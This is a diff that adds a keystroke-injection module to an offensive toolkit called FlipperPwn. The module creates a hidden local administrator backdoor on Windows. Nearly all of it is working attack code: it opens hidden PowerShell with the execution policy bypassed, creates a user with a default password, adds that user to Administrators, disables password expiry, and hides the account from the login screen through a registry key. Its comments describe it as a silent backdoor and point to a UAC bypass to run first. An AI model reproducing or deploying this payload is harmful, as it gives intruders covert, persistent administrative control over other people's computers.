@@ -1,0 +1,47 @@
+# FlipperPwn Module: Create Backdoor Local Administrator Account
+# Creates a new local user, adds them to the Administrators group, and hides them
+# from the Windows login screen via a registry key.
+# REQUIRES ADMIN — run uac_bypass_fodhelper first if not already elevated.
+#
+# The SpecialAccounts\UserList registry key suppresses the account from the
+# Windows login UI (Welcome screen and fast user switching), making it a silent backdoor.
+# The account is still fully accessible via RDP, runas, and net use.
+#
+# To remove: net user {{USERNAME}} /delete
+
+NAME add_user
+DESCRIPTION Create a hidden local administrator backdoor account (requires admin)
+CATEGORY post
+PLATFORMS WIN
+
+OPTION USERNAME svcadmin "Username for the backdoor account"
+OPTION PASSWORD P@ssw0rd123! "Password for the backdoor account (use a strong password)"
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog — must already be running as admin
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Create the local user account
+  STRING net user {{USERNAME}} "{{PASSWORD}}" /add
+  ENTER
+  DELAY 500
+  # Add the account to the local Administrators group
+  STRING net localgroup Administrators {{USERNAME}} /add
+  ENTER
+  DELAY 500
+  # Set password to never expire so the account doesn't lock out
+  STRING wmic useraccount where "Name='{{USERNAME}}'" set PasswordExpires=FALSE
+  ENTER
+  DELAY 500
+  # Hide account from the Windows login screen (SpecialAccounts\UserList DWORD=0)
+  # This key requires HKLM write access (admin) but only affects the login UI
+  STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v {{USERNAME}} /t REG_DWORD /d 0 /f
+  ENTER
+  DELAY 500
+  # Verify the account exists and is in Administrators
+  STRING net user {{USERNAME}}
+  ENTER
